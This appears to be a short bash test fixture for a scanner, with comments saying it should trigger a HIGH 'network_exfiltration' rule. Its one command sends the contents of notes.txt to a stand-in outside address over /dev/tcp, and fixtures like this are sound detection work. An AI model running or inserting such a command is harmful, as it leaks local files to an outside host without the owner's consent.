#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
cat notes.txt > /dev/tcp/203.0.113.5/80
